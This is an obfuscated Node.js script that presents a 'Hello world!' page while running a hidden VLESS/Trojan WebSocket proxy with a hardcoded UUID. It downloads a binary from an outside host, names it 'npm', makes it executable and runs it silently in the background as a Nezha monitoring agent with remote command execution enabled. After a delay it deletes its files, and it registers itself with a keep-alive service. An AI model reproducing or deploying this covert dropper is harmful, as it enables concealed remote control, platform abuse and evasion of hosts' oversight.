const _0x18b666=_0x1a45;(function(_0x547e8b,_0x1583ff){const _0x31d46b=_0x1a45,_0x1e7b7f=_0x547e8b();while(!![]){try{const _0x4e3b6c=-parseInt(_0x31d46b(0x1a9))/0x1+-parseInt(_0x31d46b(0x14d))/0x2*(-parseInt(_0x31d46b(0x159))/0x3)+-parseInt(_0x31d46b(0x148))/0x4*(-parseInt(_0x31d46b(0x17e))/0x5)+parseInt(_0x31d46b(0x155))/0x6+parseInt(_0x31d46b(0x177))/0x7*(-parseInt(_0x31d46b(0x141))/0x8)+-parseInt(_0x31d46b(0x16d))/0x9+-parseInt(_0x31d46b(0x172))/0xa*(parseInt(_0x31d46b(0x144))/0xb);if(_0x4e3b6c===_0x1583ff)break;else _0x1e7b7f['push'](_0x1e7b7f['shift']());}catch(_0x53cdfe){_0x1e7b7f['push'](_0x1e7b7f['shift']());}}}(_0x13f8,0x64b3e));function _0x1a45(_0xbe41fe,_0x10ed96){_0xbe41fe=_0xbe41fe-0x13c;const _0x13f87c=_0x13f8();let _0x1a4526=_0x13f87c[_0xbe41fe];return _0x1a4526;}const os=require('os'),http=require(_0x18b666(0x180)),fs=require('fs'),axios=require(_0x18b666(0x1a8)),net=require(_0x18b666(0x171)),path=require(_0x18b666(0x1a4)),crypto=require('crypto'),{Buffer}=require(_0x18b666(0x13d)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x18b666(0x16b)]||'715abf30-2577-8d99-6d76-8d60cea59ab5',NEZHA_SERVER=process[_0x18b666(0x1af)][_0x18b666(0x174)]||'',NEZHA_PORT=process[_0x18b666(0x1af)][_0x18b666(0x1a7)]||'',NEZHA_KEY=process[_0x18b666(0x1af)][_0x18b666(0x168)]||'',DOMAIN=process[_0x18b666(0x1af)][_0x18b666(0x187)]||'edisonhu.de5.net',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x18b666(0x1af)]['WSPATH']||UUID[_0x18b666(0x1a1)](0x0,0x8),SUB_PATH=process[_0x18b666(0x1af)]['SUB_PATH']||_0x18b666(0x13e),NAME=process[_0x18b666(0x1af)]['NAME']||_0x18b666(0x163),PORT=process[_0x18b666(0x1af)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x914d05=_0x18b666;try{const _0x551517=await axios[_0x914d05(0x18c)](_0x914d05(0x184)),_0x23d5e4=_0x551517[_0x914d05(0x173)];ISP=(_0x23d5e4[_0x914d05(0x185)]+'-'+_0x23d5e4[_0x914d05(0x199)])['replace'](/ /g,'_');}catch(_0x3c249a){ISP='Unknown';}};GetISP();const httpServer=http[_0x18b666(0x149)]((_0x375b03,_0x551399)=>{const _0x2a29d0=_0x18b666;if(_0x375b03[_0x2a29d0(0x193)]==='/'){const _0x2f7be2=path['join'](__dirname,_0x2a29d0(0x186));fs[_0x2a29d0(0x196)](_0x2f7be2,'utf8',(_0x5be6bc,_0x1850a6)=>{const _0x5e599b=_0x2a29d0;if(_0x5be6bc){_0x551399[_0x5e599b(0x18a)](0xc8,{'Content-Type':_0x5e599b(0x1a5)}),_0x551399[_0x5e599b(0x1ac)](_0x5e599b(0x146));return;}_0x551399[_0x5e599b(0x18a)](0xc8,{'Content-Type':_0x5e599b(0x1a5)}),_0x551399[_0x5e599b(0x1ac)](_0x1850a6);});return;}else{if(_0x375b03[_0x2a29d0(0x193)]==='/'+SUB_PATH){const _0x355e5a=_0x2a29d0(0x165)+UUID+'@'+DOMAIN+_0x2a29d0(0x151)+DOMAIN+_0x2a29d0(0x160)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x4ba6b2=_0x2a29d0(0x14a)+UUID+'@'+DOMAIN+_0x2a29d0(0x14b)+DOMAIN+_0x2a29d0(0x160)+DOMAIN+_0x2a29d0(0x17c)+WSPATH+'#'+NAME+'-'+ISP,_0x5d40c1=_0x355e5a+'\x0a'+_0x4ba6b2,_0x31c873=Buffer['from'](_0x5d40c1)[_0x2a29d0(0x15d)](_0x2a29d0(0x18b));_0x551399[_0x2a29d0(0x18a)](0xc8,{'Content-Type':_0x2a29d0(0x1b6)}),_0x551399[_0x2a29d0(0x1ac)](_0x31c873+'\x0a');}else _0x551399['writeHead'](0x194,{'Content-Type':_0x2a29d0(0x1b6)}),_0x551399[_0x2a29d0(0x1ac)](_0x2a29d0(0x162));}}),wss=new WebSocket[(_0x18b666(0x16a))]({'server':httpServer}),uuid=UUID[_0x18b666(0x1aa)](/-/g,''),DNS_SERVERS=[_0x18b666(0x1b2),'1.1.1.1'];function _0x13f8(){const _0x1c991e=['substr','http','test','https://amd64.ssss.nyc.mn/agent','npm','https://speed.cloudflare.com/meta','country','index.html','DOMAIN','readUInt16BE','createWriteStream','writeHead','base64','get','utf-8','decode','arm64','find','https://arm64.ssss.nyc.mn/v1','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','url','443','join','readFile','unlink','concat','asOrganization','pop','every','npm\x20running\x20error:','arm','pipe','Answer','chmod\x20+x\x20npm','slice','error','/bin/bash','path','text/html','https://','NEZHA_PORT','axios','458178kPWODI','replace','update','end','true','error:\x20','env','Status','2087','8.8.4.4','digest','npm\x20is\x20already\x20running,\x20skip\x20running...','listen','text/plain','arch','buffer','sub','stream','\x20with\x20all\x20DNS\x20servers','95664cgAnMy','reduce','client_secret:\x20','30195RpiLvI','2083','Hello\x20world!','setsid\x20nohup\x20./npm\x20-s\x20','292908aVLLXN','createServer','trojan://',':443?security=tls&sni=','8443','15902iucAxQ','Failed\x20to\x20resolve\x20','map','readUInt8',':443?encryption=none&security=tls&sni=','--tls','Automatic\x20Access\x20Task\x20added\x20successfully','catch','4780338DQUcDD','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','finish','write','201ZojGhh','close','connection','Server\x20is\x20running\x20on\x20port\x20','toString','https://arm64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','&fp=chrome&type=ws&host=','type','Not\x20Found\x0a','Hug','\x20-p\x20','vless://','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','split','NEZHA_KEY','log','Server','UUID','writeFileSync','7235271aJumfm','message','connect','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','net','1100jobIBT','data','NEZHA_SERVER','then','includes','7zQLEzs','length','2053','https://amd64.ssss.nyc.mn/v1','trim','&path=%2F','2096','45swBgQX'];_0x13f8=function(){return _0x1c991e;};return _0x13f8();}function resolveHost(_0x20351f){return new Promise((_0xdc80b,_0x403e44)=>{const _0x48315a=_0x1a45;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x48315a(0x181)](_0x20351f)){_0xdc80b(_0x20351f);return;}let _0x1f20b9=0x0;function _0x15be25(){const _0x2673bc=_0x48315a;if(_0x1f20b9>=DNS_SERVERS[_0x2673bc(0x178)]){_0x403e44(new Error(_0x2673bc(0x14e)+_0x20351f+_0x2673bc(0x140)));return;}const _0x11965f=DNS_SERVERS[_0x1f20b9];_0x1f20b9++;const _0x8d4917='https://dns.google/resolve?name='+encodeURIComponent(_0x20351f)+'&type=A';axios['get'](_0x8d4917,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x1f54fd=>{const _0x4ac86f=_0x2673bc,_0x30561e=_0x1f54fd[_0x4ac86f(0x173)];if(_0x30561e[_0x4ac86f(0x1b0)]===0x0&&_0x30561e[_0x4ac86f(0x19f)]&&_0x30561e[_0x4ac86f(0x19f)][_0x4ac86f(0x178)]>0x0){const _0x2ecc44=_0x30561e['Answer'][_0x4ac86f(0x190)](_0x264b80=>_0x264b80[_0x4ac86f(0x161)]===0x1);if(_0x2ecc44){_0xdc80b(_0x2ecc44[_0x4ac86f(0x173)]);return;}}_0x15be25();})[_0x2673bc(0x154)](_0x5af1a1=>{_0x15be25();});}_0x15be25();});}function handleVlessConnection(_0x16ff83,_0x5ad191){const _0x3507e0=_0x18b666,[_0x39e4df]=_0x5ad191,_0x165c78=_0x5ad191[_0x3507e0(0x1a1)](0x1,0x11);if(!_0x165c78[_0x3507e0(0x19b)]((_0x3e51e6,_0x5e1cf8)=>_0x3e51e6==parseInt(uuid[_0x3507e0(0x17f)](_0x5e1cf8*0x2,0x2),0x10)))return![];let _0x64daf2=_0x5ad191[_0x3507e0(0x1a1)](0x11,0x12)[_0x3507e0(0x150)]()+0x13;const _0x2e795d=_0x5ad191[_0x3507e0(0x1a1)](_0x64daf2,_0x64daf2+=0x2)[_0x3507e0(0x188)](0x0),_0x22f87b=_0x5ad191[_0x3507e0(0x1a1)](_0x64daf2,_0x64daf2+=0x1)['readUInt8'](),_0x292a39=_0x22f87b==0x1?_0x5ad191[_0x3507e0(0x1a1)](_0x64daf2,_0x64daf2+=0x4)[_0x3507e0(0x195)]('.'):_0x22f87b==0x2?new TextDecoder()[_0x3507e0(0x18e)](_0x5ad191[_0x3507e0(0x1a1)](_0x64daf2+0x1,_0x64daf2+=0x1+_0x5ad191[_0x3507e0(0x1a1)](_0x64daf2,_0x64daf2+0x1)[_0x3507e0(0x150)]())):_0x22f87b==0x3?_0x5ad191[_0x3507e0(0x1a1)](_0x64daf2,_0x64daf2+=0x10)[_0x3507e0(0x142)]((_0x2d32bc,_0x30d763,_0x582cb2,_0x38ea22)=>_0x582cb2%0x2?_0x2d32bc['concat'](_0x38ea22[_0x3507e0(0x1a1)](_0x582cb2-0x1,_0x582cb2+0x1)):_0x2d32bc,[])[_0x3507e0(0x14f)](_0x278c9f=>_0x278c9f[_0x3507e0(0x188)](0x0)[_0x3507e0(0x15d)](0x10))['join'](':'):'';_0x16ff83['send'](new Uint8Array([_0x39e4df,0x0]));const _0x202d6a=createWebSocketStream(_0x16ff83);return resolveHost(_0x292a39)[_0x3507e0(0x175)](_0x50ef87=>{const _0x5efba8=_0x3507e0;net[_0x5efba8(0x16f)]({'host':_0x50ef87,'port':_0x2e795d},function(){const _0x482d3c=_0x5efba8;this[_0x482d3c(0x158)](_0x5ad191[_0x482d3c(0x1a1)](_0x64daf2)),_0x202d6a['on'](_0x482d3c(0x1a2),()=>{})['pipe'](this)['on']('error',()=>{})[_0x482d3c(0x19e)](_0x202d6a);})['on'](_0x5efba8(0x1a2),()=>{});})['catch'](_0x53a6b7=>{const _0x241ca4=_0x3507e0;net[_0x241ca4(0x16f)]({'host':_0x292a39,'port':_0x2e795d},function(){const _0x18eb63=_0x241ca4;this[_0x18eb63(0x158)](_0x5ad191[_0x18eb63(0x1a1)](_0x64daf2)),_0x202d6a['on'](_0x18eb63(0x1a2),()=>{})[_0x18eb63(0x19e)](this)['on']('error',()=>{})['pipe'](_0x202d6a);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x19061b,_0x26aade){const _0x343c9d=_0x18b666;try{if(_0x26aade[_0x343c9d(0x178)]<0x3a)return![];const _0x5ead20=_0x26aade[_0x343c9d(0x1a1)](0x0,0x38)['toString'](),_0x229697=[UUID];let _0x442a8c=null;for(const _0x3f49e5 of _0x229697){const _0x5f28a8=crypto['createHash']('sha224')[_0x343c9d(0x1ab)](_0x3f49e5)[_0x343c9d(0x1b3)]('hex');if(_0x5f28a8===_0x5ead20){_0x442a8c=_0x3f49e5;break;}}if(!_0x442a8c)return![];let _0x48180a=0x38;_0x26aade[_0x48180a]===0xd&&_0x26aade[_0x48180a+0x1]===0xa&&(_0x48180a+=0x2);const _0x551aa8=_0x26aade[_0x48180a];if(_0x551aa8!==0x1)return![];_0x48180a+=0x1;const _0x1080a0=_0x26aade[_0x48180a];_0x48180a+=0x1;let _0x2a1ff6,_0x5b7f65;if(_0x1080a0===0x1)_0x2a1ff6=_0x26aade['slice'](_0x48180a,_0x48180a+0x4)['join']('.'),_0x48180a+=0x4;else{if(_0x1080a0===0x3){const _0x5e333d=_0x26aade[_0x48180a];_0x48180a+=0x1,_0x2a1ff6=_0x26aade[_0x343c9d(0x1a1)](_0x48180a,_0x48180a+_0x5e333d)[_0x343c9d(0x15d)](),_0x48180a+=_0x5e333d;}else{if(_0x1080a0===0x4)_0x2a1ff6=_0x26aade[_0x343c9d(0x1a1)](_0x48180a,_0x48180a+0x10)[_0x343c9d(0x142)]((_0x3cacb1,_0x440e7a,_0x4724f9,_0x5dc642)=>_0x4724f9%0x2?_0x3cacb1[_0x343c9d(0x198)](_0x5dc642[_0x343c9d(0x1a1)](_0x4724f9-0x1,_0x4724f9+0x1)):_0x3cacb1,[])[_0x343c9d(0x14f)](_0xc96d52=>_0xc96d52['readUInt16BE'](0x0)['toString'](0x10))[_0x343c9d(0x195)](':'),_0x48180a+=0x10;else return![];}}_0x5b7f65=_0x26aade['readUInt16BE'](_0x48180a),_0x48180a+=0x2;_0x48180a<_0x26aade['length']&&_0x26aade[_0x48180a]===0xd&&_0x26aade[_0x48180a+0x1]===0xa&&(_0x48180a+=0x2);const _0x5ecfc3=createWebSocketStream(_0x19061b);return resolveHost(_0x2a1ff6)[_0x343c9d(0x175)](_0x29e535=>{const _0xdd11c7=_0x343c9d;net[_0xdd11c7(0x16f)]({'host':_0x29e535,'port':_0x5b7f65},function(){const _0xb0d719=_0xdd11c7;_0x48180a<_0x26aade[_0xb0d719(0x178)]&&this[_0xb0d719(0x158)](_0x26aade[_0xb0d719(0x1a1)](_0x48180a)),_0x5ecfc3['on'](_0xb0d719(0x1a2),()=>{})[_0xb0d719(0x19e)](this)['on']('error',()=>{})[_0xb0d719(0x19e)](_0x5ecfc3);})['on'](_0xdd11c7(0x1a2),()=>{});})[_0x343c9d(0x154)](_0x5b7cbf=>{const _0x50ce90=_0x343c9d;net[_0x50ce90(0x16f)]({'host':_0x2a1ff6,'port':_0x5b7f65},function(){const _0x45f658=_0x50ce90;_0x48180a<_0x26aade[_0x45f658(0x178)]&&this[_0x45f658(0x158)](_0x26aade['slice'](_0x48180a)),_0x5ecfc3['on'](_0x45f658(0x1a2),()=>{})[_0x45f658(0x19e)](this)['on']('error',()=>{})[_0x45f658(0x19e)](_0x5ecfc3);})['on'](_0x50ce90(0x1a2),()=>{});}),!![];}catch(_0x1cc861){return![];}}wss['on'](_0x18b666(0x15b),(_0x4ac22f,_0x57a7a7)=>{const _0x3c815b=_0x18b666,_0x2a18f9=_0x57a7a7[_0x3c815b(0x193)]||'';_0x4ac22f['once'](_0x3c815b(0x16e),_0x37b397=>{const _0x5ef996=_0x3c815b;if(_0x37b397[_0x5ef996(0x178)]>0x11&&_0x37b397[0x0]===0x0){const _0xc53d8=_0x37b397[_0x5ef996(0x1a1)](0x1,0x11),_0x2f57b8=_0xc53d8[_0x5ef996(0x19b)]((_0x43e1d4,_0x2fe2f1)=>_0x43e1d4==parseInt(uuid[_0x5ef996(0x17f)](_0x2fe2f1*0x2,0x2),0x10));if(_0x2f57b8){!handleVlessConnection(_0x4ac22f,_0x37b397)&&_0x4ac22f['close']();return;}}!handleTrojanConnection(_0x4ac22f,_0x37b397)&&_0x4ac22f[_0x5ef996(0x15a)]();})['on'](_0x3c815b(0x1a2),()=>{});});const getDownloadUrl=()=>{const _0x307e96=_0x18b666,_0x59e9ca=os[_0x307e96(0x13c)]();return _0x59e9ca===_0x307e96(0x19d)||_0x59e9ca===_0x307e96(0x18f)||_0x59e9ca==='aarch64'?!NEZHA_PORT?_0x307e96(0x191):_0x307e96(0x15e):!NEZHA_PORT?_0x307e96(0x17a):_0x307e96(0x182);},downloadFile=async()=>{const _0x3c12ef=_0x18b666;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x454fe6=getDownloadUrl(),_0x4eb09a=await axios({'method':_0x3c12ef(0x18c),'url':_0x454fe6,'responseType':_0x3c12ef(0x13f)}),_0x59a554=fs[_0x3c12ef(0x189)](_0x3c12ef(0x183));return _0x4eb09a[_0x3c12ef(0x173)][_0x3c12ef(0x19e)](_0x59a554),new Promise((_0x38f4e9,_0x4b224f)=>{const _0x597ea0=_0x3c12ef;_0x59a554['on'](_0x597ea0(0x157),()=>{const _0x3e0779=_0x597ea0;console['log']('npm\x20download\x20successfully'),exec(_0x3e0779(0x1a0),_0x416bb9=>{if(_0x416bb9)_0x4b224f(_0x416bb9);_0x38f4e9();});}),_0x59a554['on']('error',_0x4b224f);});}catch(_0x1b9e18){throw _0x1b9e18;}},runnz=async()=>{const _0x3056d4=_0x18b666;try{const _0x5ed665=execSync(_0x3056d4(0x166),{'encoding':_0x3056d4(0x18d)});if(_0x5ed665[_0x3056d4(0x17b)]()!==''){console[_0x3056d4(0x169)](_0x3056d4(0x1b4));return;}}catch(_0x51753f){}await downloadFile();let _0x407684='',_0x1cbbb7=[_0x3056d4(0x194),_0x3056d4(0x14c),_0x3056d4(0x17d),_0x3056d4(0x1b1),_0x3056d4(0x145),_0x3056d4(0x179)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4c4760=_0x1cbbb7[_0x3056d4(0x176)](NEZHA_PORT)?_0x3056d4(0x152):'';_0x407684=_0x3056d4(0x147)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3056d4(0x164)+NEZHA_KEY+'\x20'+_0x4c4760+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x23106e=NEZHA_SERVER[_0x3056d4(0x176)](':')?NEZHA_SERVER[_0x3056d4(0x167)](':')[_0x3056d4(0x19a)]():'',_0x20b44d=_0x1cbbb7[_0x3056d4(0x176)](_0x23106e)?_0x3056d4(0x1ad):'false',_0xc0466d=_0x3056d4(0x143)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3056d4(0x156)+_0x20b44d+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3056d4(0x16c)]('config.yaml',_0xc0466d);}_0x407684=_0x3056d4(0x170);}else{console['log'](_0x3056d4(0x192));return;}}try{exec(_0x407684,{'shell':_0x3056d4(0x1a3)},_0x34d8f3=>{const _0x49a3f0=_0x3056d4;if(_0x34d8f3)console['error'](_0x49a3f0(0x19c),_0x34d8f3);else console[_0x49a3f0(0x169)]('npm\x20is\x20running');});}catch(_0x35c095){console['error'](_0x3056d4(0x1ae)+_0x35c095);}};async function addAccessTask(){const _0x37a4b1=_0x18b666;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x9f7021=_0x37a4b1(0x1a6)+DOMAIN;try{const _0x321cdd=await axios['post'](_0x37a4b1(0x15f),{'url':_0x9f7021},{'headers':{'Content-Type':'application/json'}});console[_0x37a4b1(0x169)](_0x37a4b1(0x153));}catch(_0x56bf26){}}const delFiles=()=>{const _0x27967f=_0x18b666;fs[_0x27967f(0x197)](_0x27967f(0x183),()=>{}),fs[_0x27967f(0x197)]('config.yaml',()=>{});};httpServer[_0x18b666(0x1b5)](PORT,()=>{const _0x4ef3e2=_0x18b666;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x4ef3e2(0x15c)+PORT);});